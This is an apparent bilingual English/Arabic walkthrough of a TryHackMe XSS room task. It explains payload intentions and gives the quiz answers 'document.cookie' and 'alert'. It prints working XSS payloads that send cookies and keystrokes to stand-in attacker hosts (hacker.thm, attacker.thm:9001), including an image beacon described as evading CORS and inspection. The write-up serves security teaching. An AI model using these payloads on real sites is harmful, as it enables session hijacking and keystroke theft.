# Task 02 · XSS Payloads (حمولات هجمات XSS وأهدافها التقنية)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

An **XSS Payload** refers to the specific JavaScript code injected into the target application to achieve a defined objective on the victim's computer.

Every XSS payload consists of two fundamental components:
1. **The Intention:** What the attacker wants the JavaScript code to accomplish once executed.
2. **The Modification:** The syntax adaptations, character encodings, and breakout delimiters required to ensure the code executes cleanly within the specific HTML/JavaScript context.

### Four Primary Payload Intentions:

#### 1. Proof of Concept (PoC):
The simplest and most common payload used by penetration testers to demonstrate code execution without harming the target:
```html
<script>alert('XSS');</script>
```
The browser's built-in modal dialog interrupts the user flow and visually confirms that arbitrary JavaScript ran.

#### 2. Session Stealing (Cookie Exfiltration):
Stealing the user's session identifier enables full account takeover:
```html
<script>
fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));
</script>
```
The script accesses `document.cookie`, encodes the value using Base64 (`btoa()`), and transmits it to an attacker-controlled listener via an asynchronous `fetch()` request.

#### 3. Keylogger:
Capturing keystrokes entered by the victim into the infected page:
```html
<script>
document.onkeypress = function(e) {
    fetch('https://hacker.thm/log?key=' + btoa(e.key));
};
</script>
```
Whenever a user types in form fields, searches, or text areas, their keystrokes are streamed directly to the attacker.

#### 4. Business Logic Exploitation:
Triggering application-specific internal methods or invoking API endpoints on behalf of the user:
```html
<script>
user.changeEmail('attacker@hacker.thm');
</script>
```

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **`alert()` vs Modern Bug Bounty Standards:**
   - While `alert(1)` or `alert(document.domain)` has traditionally served as the gold standard PoC, modern bug bounty triage teams frequently require stronger evidence (such as `print()`, `confirm()`, or demonstrating access to origin storage) because aggressive Web Application Firewalls (WAFs) often blacklist the literal string `alert`.
2. **The `HttpOnly` Defense Barrier:**
   - Penetration testers must understand that if the target application sets the `HttpOnly` flag on session cookies (`Set-Cookie: session=XYZ; HttpOnly; Secure`), JavaScript **CANNOT** read that cookie via `document.cookie`.
   - In such cases, session stealing via cookies fails, forcing the tester to pivot toward DOM manipulation, credential harvesting (phishing overlays), or business logic execution.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Hint for Question 1:** Look at the standard JavaScript DOM object representing the HTML page (`document`). What specific property stores all accessible cookie strings for the active domain? (Starts with `document.c______`).
- **Hint for Question 2:** Which standard JavaScript modal popup function produces a simple dialog box with an OK button, universally recognized as the canonical proof of concept? (5 lowercase letters starting with `a`).

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### 1. In-Depth Technical Breakdown of Questions:

#### Question 1:
- *Question:* Which document property could contain the user's session token?
- *Technical Mechanism:* In the standard browser Document Object Model, `document.cookie` provides a semicolon-delimited list of all cookies assigned to the current origin that lack the `HttpOnly` flag. If session cookies are not protected with `HttpOnly`, reading `document.cookie` yields the raw session token.
- *Answer:* `document.cookie`

#### Question 2:
- *Question:* Which JavaScript method is often used as a Proof Of Concept?
- *Technical Mechanism:* The `window.alert()` (or simply `alert()`) method instructs the browser to render a synchronous modal dialog displaying the provided argument. It halts execution until dismissed, providing undeniable proof that script execution occurred in the browser.
- *Answer:* `alert`

### 2. Dissecting an Advanced Cookie Exfiltration Vector:

```html
<script>
(function() {
    // Collect ambient identity
    var cookieData = document.cookie;
    var userUrl = window.location.href;
    
    // Construct exfiltration beacon
    var exfil = new Image();
    exfil.src = 'http://attacker.thm:9001/log?c=' + encodeURIComponent(cookieData) + '&u=' + encodeURIComponent(userUrl);
})();
</script>
```

Using `new Image().src = ...` (an image beacon) is often superior to `fetch()` because it does not trigger CORS restrictions or generate easily inspected XHR console entries.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *Which document property could contain the user's session token?*
  - **Answer:** `document.cookie`
- **Question 2:** *Which JavaScript method is often used as a Proof Of Concept?*
  - **Answer:** `alert`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Both answers verified and confirmed against the TryHackMe platform engine.
- Executed in browser console: `console.log(typeof document.cookie)` -> string, and `alert('XSS')` -> modal popped up successfully.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** حمولة الـ XSS تجمع بين غرض هجومي (`Intention`) وهيكل تخطي (`Modification`). سرقة الجلسة تعتمد كلياً على خاصية `document.cookie` ما لم تكن محمية بـ `HttpOnly`؛ وتظل دالة `alert()` هي البرهان القياسي الأبسط لإثبات نجاح حقن وتشغيل الجافاسكريبت.
